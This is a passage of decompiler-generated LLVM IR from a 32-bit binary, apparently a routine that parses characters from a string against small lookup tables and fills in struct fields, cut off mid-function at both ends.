  %v1_804c95b = icmp eq i1 %v11_804c958, false
  br i1 %v1_804c95b, label %dec_label_pc_804cb94, label %dec_label_pc_804c961

dec_label_pc_804c961:                             ; preds = %dec_label_pc_804c958
  %tmp91 = icmp slt i32 %v0_804c96f, 1
  br i1 %tmp91, label %dec_label_pc_804cb94, label %dec_label_pc_804c969

dec_label_pc_804c969:                             ; preds = %dec_label_pc_804c961
  store i32 %v8_804c87f, i32* %eax.global-to-local, align 4
  %v1_804c96e = add i32 %v1_804c978, 1
  store i32 %v1_804c96e, i32* @esi, align 4
  %v1_804c96f = load i32, i32* @esp, align 4
  %v3_804c96f = add i32 %v8_804c87f, 68
  %v4_804c96f = add i32 %v3_804c96f, %v1_804c96f
  %v5_804c96f = inttoptr i32 %v4_804c96f to i32*
  store i32 %v0_804c96f, i32* %v5_804c96f, align 4
  %v0_804c9b3.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c980

dec_label_pc_804c975:                             ; preds = %dec_label_pc_804c951
  %v1_804c975 = add i32 %v0_804c975, 1
  store i32 %v1_804c975, i32* %eax.global-to-local, align 4
  %v12_804c978 = icmp eq i32 %v1_804c975, %v1_804c978
  %v1_804c97a = icmp eq i1 %v12_804c978, false
  br i1 %v1_804c97a, label %dec_label_pc_804cb94, label %dec_label_pc_804c980

dec_label_pc_804c980:                             ; preds = %dec_label_pc_804c975, %dec_label_pc_804c969
  %v0_804c9b3.pre.pre.pre = phi i32 [ %v1_804c978, %dec_label_pc_804c975 ], [ %v0_804c9b3.pre.pre.pre.pre, %dec_label_pc_804c969 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c985

dec_label_pc_804c985:                             ; preds = %dec_label_pc_804c94c, %dec_label_pc_804c980
  %v0_804c9b3.pre.pre = phi i32 [ %v1_804c978, %dec_label_pc_804c94c ], [ %v0_804c9b3.pre.pre.pre, %dec_label_pc_804c980 ]
  %v0_804c81e = phi i32 [ %v0_804c96f, %dec_label_pc_804c94c ], [ -2147483648, %dec_label_pc_804c980 ]
  %v4_804c985 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804c985 = icmp eq i32 %v4_804c985, 0
  %v1_804c98a = icmp eq i1 %v5_804c985, false
  %.pre = inttoptr i32 %v0_804c9b3.pre.pre to i8*
  br i1 %v1_804c98a, label %dec_label_pc_804c9ae, label %dec_label_pc_804c990

dec_label_pc_804c990:                             ; preds = %dec_label_pc_804c985
  %v2_804c990 = load i8, i8* %.pre, align 1
  %v11_804c990 = icmp eq i8 %v2_804c990, 46
  %v1_804c993 = icmp eq i1 %v11_804c990, false
  br i1 %v1_804c993, label %dec_label_pc_804c9a7, label %dec_label_pc_804c995

dec_label_pc_804c995:                             ; preds = %dec_label_pc_804c990
  %v1_804c995 = add i32 %v0_804c9b3.pre.pre, 1
  store i32 %v1_804c995, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c878.outer

dec_label_pc_804c9a7:                             ; preds = %dec_label_pc_804c990
  br label %dec_label_pc_804c9ae

dec_label_pc_804c9ae:                             ; preds = %dec_label_pc_804c985, %dec_label_pc_804c9a7
  %stack_var_-96.2 = phi i32 [ %v0_804c81e, %dec_label_pc_804c9a7 ], [ %stack_var_-96.1.ph, %dec_label_pc_804c985 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804c9a7 ], [ %v0_804c81e, %dec_label_pc_804c985 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80536e4.128 to i32), i32* @edx, align 4
  %v4_804c9b3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c9b3

dec_label_pc_804c9b3:                             ; preds = %dec_label_pc_804c9bd, %dec_label_pc_804c9ae
  %v0_804c9bd = phi i32 [ %v1_804c9bd, %dec_label_pc_804c9bd ], [ ptrtoint ([9 x i8]* @global_var_80536e4.128 to i32), %dec_label_pc_804c9ae ]
  %v4_804c9b3 = phi i32 [ %v6_804c9b3, %dec_label_pc_804c9bd ], [ %v4_804c9b3.pre, %dec_label_pc_804c9ae ]
  %v2_804c9b3 = load i8, i8* %.pre, align 1
  %v3_804c9b3 = zext i8 %v2_804c9b3 to i32
  %v5_804c9b3 = and i32 %v4_804c9b3, -256
  %v6_804c9b3 = or i32 %v3_804c9b3, %v5_804c9b3
  store i32 %v6_804c9b3, i32* %eax.global-to-local, align 4
  %v3_804c9b5 = inttoptr i32 %v0_804c9bd to i8*
  %v4_804c9b5 = load i8, i8* %v3_804c9b5, align 1
  %v15_804c9b5 = icmp eq i8 %v2_804c9b3, %v4_804c9b5
  br i1 %v15_804c9b5, label %dec_label_pc_804c825, label %dec_label_pc_804c9bd

dec_label_pc_804c9bd:                             ; preds = %dec_label_pc_804c9b3
  %v1_804c9bd = add i32 %v0_804c9bd, 1
  store i32 %v1_804c9bd, i32* @edx, align 4
  %v1_804c9be = inttoptr i32 %v1_804c9bd to i8*
  %v2_804c9be = load i8, i8* %v1_804c9be, align 1
  %v3_804c9be = icmp eq i8 %v2_804c9be, 0
  %v1_804c9c1 = icmp eq i1 %v3_804c9be, false
  br i1 %v1_804c9c1, label %dec_label_pc_804c9b3, label %dec_label_pc_804c9c3

dec_label_pc_804c9c3:                             ; preds = %dec_label_pc_804c9bd, %dec_label_pc_804c825
  %v0_804c9d6 = phi i32 [ %v1_804c825, %dec_label_pc_804c825 ], [ %v0_804c9b3.pre.pre, %dec_label_pc_804c9bd ]
  %v0_804c9d3 = phi i32 [ %v0_804c9bd, %dec_label_pc_804c825 ], [ %v1_804c9bd, %dec_label_pc_804c9bd ]
  %v1_804c9c5 = add i32 %v0_804c9d3, -134559460
  %v1_804c9ca = add i32 %v0_804c9d3, -134559461
  %v5_804c9ca = sub i32 134559460, %v0_804c9d3
  %v6_804c9ca = and i32 %v1_804c9c5, %v5_804c9ca
  %v7_804c9ca = icmp slt i32 %v6_804c9ca, 0
  %v8_804c9ca = icmp eq i32 %v1_804c9ca, 0
  %v9_804c9ca = icmp slt i32 %v1_804c9ca, 0
  store i32 %v1_804c9ca, i32* %eax.global-to-local, align 4
  %v3_804c9cb = icmp eq i1 %v9_804c9ca, %v7_804c9ca
  %v4_804c9cb = icmp eq i1 %v8_804c9ca, false
  %v5_804c9cb = and i1 %v4_804c9cb, %v3_804c9cb
  br i1 %v5_804c9cb, label %dec_label_pc_804c9d7, label %dec_label_pc_804c9cd

dec_label_pc_804c9cd:                             ; preds = %dec_label_pc_804c9c3
  %v1_804c9cd = inttoptr i32 %v0_804c9d6 to i8*
  %v2_804c9cd = load i8, i8* %v1_804c9cd, align 1
  %v3_804c9cd = zext i8 %v2_804c9cd to i32
  %v5_804c9cd = and i32 %v1_804c9ca, -256
  %v6_804c9cd = or i32 %v3_804c9cd, %v5_804c9cd
  store i32 %v6_804c9cd, i32* %eax.global-to-local, align 4
  %v3_804c9cf = inttoptr i32 %v0_804c9d3 to i8*
  %v4_804c9cf = load i8, i8* %v3_804c9cf, align 1
  %v15_804c9cf = icmp eq i8 %v2_804c9cd, %v4_804c9cf
  %v1_804c9d1 = icmp eq i1 %v15_804c9cf, false
  br i1 %v1_804c9d1, label %dec_label_pc_804c9d7, label %dec_label_pc_804c9d3

dec_label_pc_804c9d3:                             ; preds = %dec_label_pc_804c9cd
  %v1_804c9d3 = add i32 %v0_804c9d3, 9
  store i32 %v1_804c9d3, i32* @edx, align 4
  %v1_804c9d6 = add i32 %v0_804c9d6, 1
  store i32 %v1_804c9d6, i32* @esi, align 4
  br label %dec_label_pc_804c9d7

dec_label_pc_804c9d7:                             ; preds = %dec_label_pc_804c9cd, %dec_label_pc_804c9c3, %dec_label_pc_804c9d3
  %v4_804c9de = phi i32 [ %v6_804c9cd, %dec_label_pc_804c9cd ], [ %v1_804c9ca, %dec_label_pc_804c9c3 ], [ %v6_804c9cd, %dec_label_pc_804c9d3 ]
  %v0_804c9de = phi i32 [ %v0_804c9d6, %dec_label_pc_804c9cd ], [ %v0_804c9d6, %dec_label_pc_804c9c3 ], [ %v1_804c9d6, %dec_label_pc_804c9d3 ]
  %v0_804c9d7 = phi i32 [ %v0_804c9d3, %dec_label_pc_804c9cd ], [ %v0_804c9d3, %dec_label_pc_804c9c3 ], [ %v1_804c9d3, %dec_label_pc_804c9d3 ]
  %v1_804c9d7 = add i32 %v0_804c9d7, 9
  %v2_804c9d7 = inttoptr i32 %v1_804c9d7 to i8*
  %v3_804c9d7 = load i8, i8* %v2_804c9d7, align 1
  %v4_804c9d7 = sext i8 %v3_804c9d7 to i32
  %v2_804c9db = mul nsw i32 %v4_804c9d7, 256
  store i32 %v2_804c9db, i32* %ebx.global-to-local, align 4
  %v1_804c9de = inttoptr i32 %v0_804c9de to i8*
  %v2_804c9de = load i8, i8* %v1_804c9de, align 1
  %v3_804c9de = zext i8 %v2_804c9de to i32
  %v5_804c9de = and i32 %v4_804c9de, -256
  %v6_804c9de = or i32 %v3_804c9de, %v5_804c9de
  store i32 %v6_804c9de, i32* %eax.global-to-local, align 4
  %v4_804c9e0 = icmp eq i8 %v2_804c9de, 0
  br i1 %v4_804c9e0, label %dec_label_pc_804cb94, label %dec_label_pc_804c9e8

dec_label_pc_804c9e8:                             ; preds = %dec_label_pc_804c9d7
  store i32 ptrtoint ([21 x i8]* @global_var_8053721.129 to i32), i32* %ecx.global-to-local, align 4
  %v3_804c9ed = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804c9ed, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c9f1

dec_label_pc_804c9f1:                             ; preds = %dec_label_pc_804ca40, %dec_label_pc_804c9e8
  %v0_804ca40 = phi i32 [ %v1_804ca40, %dec_label_pc_804ca40 ], [ ptrtoint ([21 x i8]* @global_var_8053721.129 to i32), %dec_label_pc_804c9e8 ]
  %v3_804c9f1 = inttoptr i32 %v0_804ca40 to i8*
  %v4_804c9f1 = load i8, i8* %v3_804c9f1, align 1
  %v15_804c9f1 = icmp eq i8 %v2_804c9de, %v4_804c9f1
  %v1_804c9f3 = icmp eq i1 %v15_804c9f1, false
  br i1 %v1_804c9f3, label %dec_label_pc_804ca40, label %dec_label_pc_804c9f5

dec_label_pc_804c9f5:                             ; preds = %dec_label_pc_804c9f1
  %v1_804c9f7 = add i32 %v0_804ca40, -134559521
  store i32 %v1_804c9f7, i32* %edx.global-to-local, align 4
  %v7_804ca00 = icmp sgt i32 %v1_804c9f7, 17
  br i1 %v7_804ca00, label %dec_label_pc_804ca02, label %dec_label_pc_804ca0a

dec_label_pc_804ca02:                             ; preds = %dec_label_pc_804c9f5
  %v3_804ca02 = and i32 %v2_804c9db, 1024
  %v4_804ca02 = icmp eq i32 %v3_804ca02, 0
  br i1 %v4_804ca02, label %dec_label_pc_804ca0a, label %dec_label_pc_804ca07

dec_label_pc_804ca07:                             ; preds = %dec_label_pc_804ca02
  %v1_804ca07 = add i32 %v0_804ca40, -134559523
  store i32 %v1_804ca07, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ca0a

dec_label_pc_804ca0a:                             ; preds = %dec_label_pc_804c9f5, %dec_label_pc_804ca02, %dec_label_pc_804ca07
  %v0_804ca13 = phi i32 [ %v1_804c9f7, %dec_label_pc_804c9f5 ], [ %v1_804c9f7, %dec_label_pc_804ca02 ], [ %v1_804ca07, %dec_label_pc_804ca07 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053717.130 to i32), i32* %ecx.global-to-local, align 4
  %v2_804ca13 = add i32 %tmp76, 32
  %v3_804ca13 = inttoptr i32 %v2_804ca13 to i32*
  store i32 %v0_804ca13, i32* %v3_804ca13, align 4
  %v0_804ca16.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804ca1a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ca16

dec_label_pc_804ca16:                             ; preds = %dec_label_pc_804ca16, %dec_label_pc_804ca0a
  %v0_804ca16 = phi i32 [ %v1_804ca16, %dec_label_pc_804ca16 ], [ %v0_804ca16.pre, %dec_label_pc_804ca0a ]
  %v1_804ca16 = add i32 %v0_804ca16, 1
  store i32 %v1_804ca16, i32* %ecx.global-to-local, align 4
  %v1_804ca17 = inttoptr i32 %v1_804ca16 to i8*
  %v2_804ca17 = load i8, i8* %v1_804ca17, align 1
  %v3_804ca17 = sext i8 %v2_804ca17 to i32
  store i32 %v3_804ca17, i32* %eax.global-to-local, align 4
  %v8_804ca1c = icmp sgt i32 %v0_804ca1a.pre, %v3_804ca17
  br i1 %v8_804ca1c, label %dec_label_pc_804ca16, label %dec_label_pc_804ca1e

dec_label_pc_804ca1e:                             ; preds = %dec_label_pc_804ca16
  store i32 ptrtoint ([21 x i8]* @global_var_8053721.129 to i32), i32* @ecx, align 4
  %v1_804ca25 = add i32 %v0_804ca16, -134559511
  store i32 %v1_804ca25, i32* %eax.global-to-local, align 4
  %v2_804ca2a = add i32 %v0_804ca16, add (i32 ptrtoint (i32* @global_var_8053708.131 to i32), i32 -134559511)
  %v3_804ca2a = add i32 %v2_804ca2a, %v1_804ca25
  %v4_804ca2a = inttoptr i32 %v3_804ca2a to i16*
  %v5_804ca2a = load i16, i16* %v4_804ca2a, align 2
  %v6_804ca2a = sext i16 %v5_804ca2a to i32
  store i32 %v6_804ca2a, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804ca25, 2
  %v3_804ca32 = add i32 %factor, 134559480
  %v4_804ca32 = inttoptr i32 %v3_804ca32 to i16*
  %v5_804ca32 = load i16, i16* %v4_804ca32, align 2
  %v6_804ca32 = sext i16 %v5_804ca32 to i32
  store i32 %v6_804ca32, i32* %eax.global-to-local, align 4
  %v1_804ca3a = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ca3a = or i32 %v1_804ca3a, %v6_804ca2a
  %v2_804ca3c = and i32 %v2_804ca3a, %v6_804ca32
  store i32 %v2_804ca3c, i32* %edx.global-to-local, align 4
  %v0_804ca4e.pre = load i32, i32* @esi, align 4
  %v0_804ca51.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ca46

dec_label_pc_804ca40:                             ; preds = %dec_label_pc_804c9f1
  %v1_804ca40 = add i32 %v0_804ca40, 1
  store i32 %v1_804ca40, i32* @ecx, align 4
  %v1_804ca41 = inttoptr i32 %v1_804ca40 to i8*
  %v2_804ca41 = load i8, i8* %v1_804ca41, align 1
  %v3_804ca41 = icmp eq i8 %v2_804ca41, 0
  %v1_804ca44 = icmp eq i1 %v3_804ca41, false
  br i1 %v1_804ca44, label %dec_label_pc_804c9f1, label %dec_label_pc_804ca46

dec_label_pc_804ca46:                             ; preds = %dec_label_pc_804ca40, %dec_label_pc_804ca1e
  %v0_804ca51 = phi i32 [ %v0_804ca51.pre, %dec_label_pc_804ca1e ], [ %storemerge4, %dec_label_pc_804ca40 ]
  %v0_804ca4e = phi i32 [ %v0_804ca4e.pre, %dec_label_pc_804ca1e ], [ %v0_804c9de, %dec_label_pc_804ca40 ]
  %v0_804ca46 = phi i32 [ %v2_804ca3c, %dec_label_pc_804ca1e ], [ %v3_804c9ed, %dec_label_pc_804ca40 ]
  store i32 %v0_804ca46, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ca4e = inttoptr i32 %v0_804ca4e to i8*
  %v2_804ca4e = load i8, i8* %v1_804ca4e, align 1
  %v3_804ca4e = sext i8 %v2_804ca4e to i32
  store i32 %v3_804ca4e, i32* %eax.global-to-local, align 4
  %v2_804ca51 = add i32 %tmp76, 4
  %v3_804ca51 = inttoptr i32 %v2_804ca51 to i32*
  store i32 %v0_804ca51, i32* %v3_804ca51, align 4
  %v0_804ca54 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca54 = load i32, i32* @edx, align 4
  %v2_804ca54 = add i32 %v1_804ca54, 12
  %v3_804ca54 = inttoptr i32 %v2_804ca54 to i32*
  store i32 %v0_804ca54, i32* %v3_804ca54, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804ca5b = load i32, i32* @edx, align 4
  %v1_804ca5b = add i32 %v0_804ca5b, 28
  %v2_804ca5b = inttoptr i32 %v1_804ca5b to i32*
  store i32 1, i32* %v2_804ca5b, align 4
  %v0_804ca62 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca62 = load i32, i32* @edx, align 4
  %v2_804ca62 = add i32 %v1_804ca62, 8
  %v3_804ca62 = inttoptr i32 %v2_804ca62 to i32*
  store i32 %v0_804ca62, i32* %v3_804ca62, align 4
  %v0_804ca65 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ca6f = and i32 %v0_804ca65, -5
  %v0_804ca75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ca75 = and i32 %v0_804ca75, 3840
  store i32 %v1_804ca75, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804ca7e = or i32 %v1_804ca75, %v1_804ca6f
  store i32 %v2_804ca7e, i32* @edi, align 4
  %v1_804ca80 = load i32, i32* @edx, align 4
  %v2_804ca80 = add i32 %v1_804ca80, 20
  %v3_804ca80 = inttoptr i32 %v2_804ca80 to i32*
  store i32 48, i32* %v3_804ca80, align 4
  %v0_804ca83 = load i32, i32* @edi, align 4
  %v1_804ca83 = load i32, i32* @edx, align 4
  %v2_804ca83 = add i32 %v1_804ca83, 16
  %v3_804ca83 = inttoptr i32 %v2_804ca83 to i32*
  store i32 %v0_804ca83, i32* %v3_804ca83, align 4
  %v0_804ca86 = load i32, i32* @ecx, align 4
  %v1_804ca86 = inttoptr i32 %v0_804ca86 to i8*
  %v2_804ca86 = load i8, i8* %v1_804ca86, align 1
  %v3_804ca86 = icmp eq i8 %v2_804ca86, 0
  %v1_804ca89 = icmp eq i1 %v3_804ca86, false
  br i1 %v1_804ca89, label %dec_label_pc_804caa2, label %dec_label_pc_804ca8b

dec_label_pc_804ca8b:                             ; preds = %dec_label_pc_804ca46
  %v0_804ca8b = load i32, i32* @esi, align 4
  %v1_804ca8b = inttoptr i32 %v0_804ca8b to i8*
  %v2_804ca8b = load i8, i8* %v1_804ca8b, align 1
  %v11_804ca8b = icmp eq i8 %v2_804ca8b, 109
  %v1_804ca8e = icmp eq i1 %v11_804ca8b, false
  br i1 %v1_804ca8e, label %dec_label_pc_804cb94, label %dec_label_pc_804ca94

dec_label_pc_804ca94:                             ; preds = %dec_label_pc_804ca8b
  %v0_804ca94 = load i32, i32* @edx, align 4
  %v1_804ca94 = add i32 %v0_804ca94, 32
  %v2_804ca94 = inttoptr i32 %v1_804ca94 to i32*
  store i32 20, i32* %v2_804ca94, align 4
  %v0_804ca9b = load i32, i32* @edx, align 4
  %v1_804ca9b = add i32 %v0_804ca9b, 28
  %v2_804ca9b = inttoptr i32 %v1_804ca9b to i32*
  store i32 0, i32* %v2_804ca9b, align 4
  br label %dec_label_pc_804caa2

dec_label_pc_804caa2:                             ; preds = %dec_label_pc_804ca46, %dec_label_pc_804ca94
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804cb36, label %dec_label_pc_804caad

dec_label_pc_804caad:                             ; preds = %dec_label_pc_804caa2
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804caee = add i32 %tmp76, 40
  %v1_804cb27 = add i32 %tmp76, 28
  %v2_804cb27 = inttoptr i32 %v1_804cb27 to i32*
  %v4_804cabc = add i32 %tmp76, 36
  br label %dec_label_pc_804caaf

dec_label_pc_804caaf:                             ; preds = %dec_label_pc_804cb22, %dec_label_pc_804caad
  %v0_804cac5 = phi i32 [ 0, %dec_label_pc_804caad ], [ %v1_804cb26, %dec_label_pc_804cb22 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804caad ], [ %stack_var_-88.5, %dec_label_pc_804cb22 ]
  %v1_804caaf = add i32 %v0_804cac5, -2
  %v6_804caaf = sub i32 1, %v0_804cac5
  %v7_804caaf = and i32 %v6_804caaf, %v0_804cac5
  %v8_804caaf = icmp slt i32 %v7_804caaf, 0
  %v9_804caaf = icmp eq i32 %v1_804caaf, 0
  %v10_804caaf = icmp slt i32 %v1_804caaf, 0
  %v3_804cab2 = icmp eq i1 %v10_804caaf, %v8_804caaf
  %v4_804cab2 = icmp eq i1 %v9_804caaf, false
  %v5_804cab2 = and i1 %v4_804cab2, %v3_804cab2
  br i1 %v5_804cab2, label %dec_label_pc_804cac5, label %dec_label_pc_804cab4

dec_label_pc_804cab4:                             ; preds = %dec_label_pc_804caaf
  store i32 %tmp76, i32* @edx, align 4
  %v0_804cab8 = load i32, i32* @esp, align 4
  %v2_804cab8 = mul i32 %v0_804cac5, 4
  %v3_804cab8 = add i32 %v2_804cab8, 68
  %v4_804cab8 = add i32 %v3_804cab8, %v0_804cab8
  %v5_804cab8 = inttoptr i32 %v4_804cab8 to i32*
  %v6_804cab8 = load i32, i32* %v5_804cab8, align 4
  store i32 %v6_804cab8, i32* %eax.global-to-local, align 4
  %v1_804cabc = trunc i32 %v6_804cab8 to i8
  %v5_804cabc = add i32 %v4_804cabc, %v0_804cac5
  %v6_804cabc = inttoptr i32 %v5_804cabc to i8*
  store i8 %v1_804cabc, i8* %v6_804cabc, align 1
  %v0_804cac0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cac0 = urem i32 %v0_804cac0, 256
  br label %dec_label_pc_804cace

dec_label_pc_804cac5:                             ; preds = %dec_label_pc_804caaf
  %v5_804cac7 = add i32 %v0_804cac5, %stack_var_-32.3
  store i32 %v5_804cac7, i32* %eax.global-to-local, align 4
  %v1_804cacb = add i32 %v5_804cac7, -2
  br label %dec_label_pc_804cace

dec_label_pc_804cace:                             ; preds = %dec_label_pc_804cab4, %dec_label_pc_804cac5
  %v0_804cae1 = phi i32 [ %v1_804cac0, %dec_label_pc_804cab4 ], [ %v1_804cacb, %dec_label_pc_804cac5 ]
  store i32 %v0_804cae1, i32* %eax.global-to-local, align 4
  %v5_804cace = sub i32 %v0_804cae1, %stack_var_-88.4
  %v11_804cace = xor i32 %v0_804cae1, %stack_var_-88.4
  %v12_804cace = xor i32 %v5_804cace, %v0_804cae1
  %v13_804cace = and i32 %v12_804cace, %v11_804cace
  %v14_804cace = icmp slt i32 %v13_804cace, 0
  %v15_804cace = icmp eq i32 %v5_804cace, 0
  %v16_804cace = icmp slt i32 %v5_804cace, 0
  %v3_804cad2 = icmp ne i1 %v16_804cace, %v14_804cace
  %v4_804cad2 = or i1 %v15_804cace, %v3_804cad2
  br i1 %v4_804cad2, label %dec_label_pc_804cae1, label %dec_label_pc_804cad4

dec_label_pc_804cad4:                             ; preds = %dec_label_pc_804cace
  %v1_804cad4 = add i32 %v0_804cae1, -9
  %v6_804cad4 = sub i32 8, %v0_804cae1
  %v7_804cad4 = and i32 %v6_804cad4, %v0_804cae1
  %v8_804cad4 = icmp slt i32 %v7_804cad4, 0
  %v9_804cad4 = icmp eq i32 %v1_804cad4, 0
  %v10_804cad4 = icmp slt i32 %v1_804cad4, 0
  %v3_804cad7 = icmp eq i1 %v10_804cad4, %v8_804cad4
  %v4_804cad7 = icmp eq i1 %v9_804cad4, false
  %v5_804cad7 = and i1 %v4_804cad7, %v3_804cad7
  br i1 %v5_804cad7, label %dec_label_pc_804cb94, label %dec_label_pc_804cae1

dec_label_pc_804cae1:                             ; preds = %dec_label_pc_804cad4, %dec_label_pc_804cace
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804cace ], [ %v0_804cae1, %dec_label_pc_804cad4 ]
  %v1_804cae1 = add i32 %v0_804cae1, -1
  store i32 %v1_804cae1, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804caea = load i32, i32* @esp, align 4
  %v1_804caea = load i32, i32* %ebp.global-to-local, align 4
  %v2_804caea = mul i32 %v1_804caea, 4
  %v3_804caea = add i32 %v0_804caea, 80
  %v4_804caea = add i32 %v3_804caea, %v2_804caea
  %v5_804caea = inttoptr i32 %v4_804caea to i32*
  %v6_804caea = load i32, i32* %v5_804caea, align 4
  store i32 %v6_804caea, i32* %edi.global-to-local, align 4
  %v2_804caee = mul i32 %v1_804cae1, 4
  %v4_804caee = add i32 %v3_804caee, %v2_804caee
  %v5_804caee = inttoptr i32 %v4_804caee to i32*
  %v6_804caee = load i32, i32* %v5_804caee, align 4
  store i32 %v6_804caee, i32* @eax, align 4
  %v9_804caf2 = icmp eq i32 %v6_804caea, 8
  br i1 %v9_804caf2, label %dec_label_pc_804cb22, label %dec_label_pc_804caf7

dec_label_pc_804caf7:                             ; preds = %dec_label_pc_804cae1
  %v9_804caf7 = icmp eq i32 %v6_804caee, 8
  br i1 %v9_804caf7, label %dec_label_pc_804cb12, label %dec_label_pc_804cafc

dec_label_pc_804cafc:                             ; preds = %dec_label_pc_804caf7
  %v12_804cafc = icmp eq i32 %v6_804caee, %v6_804caea
  br i1 %v12_804cafc, label %dec_label_pc_804cb12, label %dec_label_pc_804cb00

dec_label_pc_804cb00:                             ; preds = %dec_label_pc_804cafc
  %v1_804cb00 = call i32 @function_804c7b0(i32 %v1_804cae1)
  store i32 %v1_804cb00, i32* %ebx.global-to-local, align 4
  %v0_804cb07 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804cb07, i32* @eax, align 4
  %v1_804cb09 = call i32 @function_804c7b0(i32 %v1_804cae1)
  store i32 %v1_804cb09, i32* %eax.global-to-local, align 4
  %v8_804cb10 = icmp sgt i32 %v1_804cb00, %v1_804cb09
  br i1 %v8_804cb10, label %dec_label_pc_804cb22, label %dec_label_pc_804cb00.dec_label_pc_804cb12_crit_edge

dec_label_pc_804cb00.dec_label_pc_804cb12_crit_edge: ; preds = %dec_label_pc_804cb00
  %v0_804cb1a.pre = load i32, i32* @esp, align 4
  %v1_804cb1a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804cb12

dec_label_pc_804cb12:                             ; preds = %dec_label_pc_804cb00.dec_label_pc_804cb12_crit_edge, %dec_label_pc_804cafc, %dec_label_pc_804caf7
  %v1_804cb1a = phi i32 [ %v1_804cb1a.pre, %dec_label_pc_804cb00.dec_label_pc_804cb12_crit_edge ], [ %v1_804caea, %dec_label_pc_804cafc ], [ %v1_804caea, %dec_label_pc_804caf7 ]
  %v0_804cb1a = phi i32 [ %v0_804cb1a.pre, %dec_label_pc_804cb00.dec_label_pc_804cb12_crit_edge ], [ %v0_804caea, %dec_label_pc_804cafc ], [ %v0_804caea, %dec_label_pc_804caf7 ]
  store i32 %v1_804cae1, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804cb1a = mul i32 %v1_804cb1a, 4
  %v3_804cb1a = add i32 %v0_804cb1a, 80
  %v4_804cb1a = add i32 %v3_804cb1a, %v2_804cb1a
  %v5_804cb1a = inttoptr i32 %v4_804cb1a to i32*
  %v6_804cb1a = load i32, i32* %v5_804cb1a, align 4
  store i32 %v6_804cb1a, i32* %eax.global-to-local, align 4
  store i32 %v6_804cb1a, i32* %v5_804caee, align 4
  br label %dec_label_pc_804cb22

dec_label_pc_804cb22:                             ; preds = %dec_label_pc_804cb00, %dec_label_pc_804cae1, %dec_label_pc_804cb12
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804cb26 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804cb26 = add i32 %v0_804cb26, 1
  store i32 %v1_804cb26, i32* %ebp.global-to-local, align 4
  %v3_804cb27 = load i32, i32* %v2_804cb27, align 4
  %v1_804cb2a = add i32 %v3_804cb27, 2
  store i32 %v1_804cb2a, i32* %eax.global-to-local, align 4
  %v5_804cb2f = icmp slt i32 %v1_804cb26, %v1_804cb2a
  br i1 %v5_804cb2f, label %dec_label_pc_804caaf, label %dec_label_pc_804cb5d

dec_label_pc_804cb36:                             ; preds = %dec_label_pc_804caa2
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804cb3a = add i32 %tmp76, 38
  %v2_804cb3a = inttoptr i32 %v1_804cb3a to i8*
  store i8 1, i8* %v2_804cb3a, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804cb43 = add i32 %tmp76, 28
  %v2_804cb43 = inttoptr i32 %v1_804cb43 to i32*
  %v3_804cb43 = load i32, i32* %v2_804cb43, align 4
  %v2_804cb46 = mul i32 %v3_804cb43, 4
  %v2_804cb4a = ptrtoint i32* %stack_var_-20 to i32
  %v1_804cb51 = add i32 %tmp76, 40
  store i32 %v1_804cb51, i32* %eax.global-to-local, align 4
  %v3_804cb55 = inttoptr i32 %v1_804cb51 to i16*
  %v4_804cb55 = call i32 @function_804d150(i16* %v3_804cb55, i32 %v2_804cb4a, i32 %v2_804cb46)
  store i32 %v4_804cb55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cb5d

dec_label_pc_804cb5d:                             ; preds = %dec_label_pc_804cb22, %dec_label_pc_804cb36
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804cb36 ], [ %stack_var_-88.5, %dec_label_pc_804cb22 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804c808, align 4
  %v0_804cb68 = load i32, i32* @ecx, align 4
  %v1_804cb68 = add i32 %v0_804cb68, 16
  %v2_804cb68 = inttoptr i32 %v1_804cb68 to i8*
  %v3_804cb68 = load i8, i8* %v2_804cb68, align 1
  %v5_804cb68 = icmp slt i8 %v3_804cb68, 0
  br i1 %v5_804cb68, label %dec_label_pc_804cb75, label %dec_label_pc_804cb6e

